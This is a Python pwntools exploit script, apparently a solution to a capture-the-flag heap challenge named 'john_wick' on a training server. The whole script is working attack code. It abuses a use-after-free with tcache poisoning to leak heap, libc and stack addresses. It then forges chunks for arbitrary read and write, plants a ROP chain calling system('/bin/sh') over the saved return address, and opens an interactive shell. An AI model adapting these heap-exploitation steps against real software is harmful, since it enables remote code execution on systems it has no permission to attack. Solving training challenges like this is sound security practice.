#!/usr/bin/env python3
from pwn import *

PORT = 1337
HOST = "pwn-john-wick-69ca58fb5e69.training.bksec.vn"
elf = context.binary = ELF('./john_wick_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x00000000000015CF
            brva 0x00000000000016F8
            brva 0x00000000000019E8
            brva 0x00000000000018AE
            brva 0x00000000000014C2
            brva 0x0000000000001B01
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=HOST)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def menu(opt): sla(b'> ', str(opt).encode())

def add(i, name, age, height, len, desc, money):
    menu(1)
    sla(b'Index: ', str(i).encode())
    sa(b'Name: ', name)
    sla(b'Age: ', str(age).encode())
    sla(b'Height (cm): ', str(height).encode())
    sla(b'Length of description: ', str(len).encode())
    sa(b'Description: ', desc)
    sla(b'1 BKSEC coin = 6M$): ', str(money).encode())

def delete(i):
    menu(2)
    sla(b'Index: ', str(i).encode())

def view(i):
    menu(3)
    sla(b'Index: ', str(i).encode())

def change(i, st):
    menu(4)
    sla(b'Index: ', str(i).encode())
    sa(b'New status: ', st + b'\n')

def edit(i, dt):
    menu(5)
    sla(b'Index: ', str(i).encode())
    sa(b'New description: ', dt)

# Stage 1: Leak heap

add(0, b'd1nhdwc0', 19, 170, 0x80, b'A'*8, -1)
add(1, b'd1nhdwc1', 19, 170, 0x80, b'B'*8, -1)
add(2, b'd1nhdwc2', 19, 170, 0x80, b'C'*8, -1)

delete(2)
delete(0)
change(1, b'A'*0x20)
# GDB()
view(1)
p.recvuntil(b'Description: ')
leak = u64(p.recvline().strip().ljust(0x8, b'\x00')) << 12
# (heap+0x300 >> 12) ^ leak = heap + 0x4e0

x = leak ^ 0x4e0
h = x
h ^= (h >> 12)
h ^= (h >> 24)
heap = (h >> 12)-0x4e0

log.success(f'heap: {hex(heap)}')

# Stage 2: Leak libc

for i in range(2, 10):
    add(i, f'd1nhdwc{i}', 19, 170, 0x100, b'X'*8, -1)

delete(2)
add(2, f'guard', 19, 170, 0x20, b'X'*8, -1)

for i in range(3, 10):
    delete(i)

pl = (heap >> 12) ^ (heap + 0x390) 

edit(1, p64(pl))
# GDB()
add(0, b'chunk0', 19, 170, 0x80, b'A'*8, -1)

fake = flat(
    p32(19), p32(170), p32(0x80),
     b'B'*29 + b'\x00',
     p16(0xffff), p32(0xffff*6),
     b'S'*0x20 + p64(heap+0xf20)
    )

add(4, b'chunk1', 19, 170, 0x80, fake, -1)

view(1)
p.recvuntil(b'cription: ')
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x204b20
log.success(f'libc: {hex(libc.address)}')

# Stage 3: Leak stack

fake = flat(
    p32(19), p32(170), p32(0x80),
     b'B'*29 + b'\x00',
     p16(0xffff), p32(0xffff*6),
     b'S'*0x20 + p64(libc.sym.environ)
    )

edit(4, fake)
# GDB()
view(1)
p.recvuntil(b'Description: ')
stack = u64(p.recv(6).ljust(8, b'\x00'))
log.success(f'stack_leak: {hex(stack)}')

# Stage 4: ROPchain -> saved rip

rip = stack - 0x140
rbp = rip - 0x8

fake = flat(
    p32(19), p32(170), p32(0x80),
     b'B'*29 + b'\x00',
     p16(0xffff), p32(0xffff*6),
     b'S'*0x20 + p64(rip)
    )

edit(4, fake)

rop = flat(
    libc.address + 0x000000000010c08d + 1,
    libc.address + 0x000000000010c08d,
    next(libc.search(b'/bin/sh\0')),
    libc.sym.system
    )
# GDB()
edit(1, rop)

p.interactive()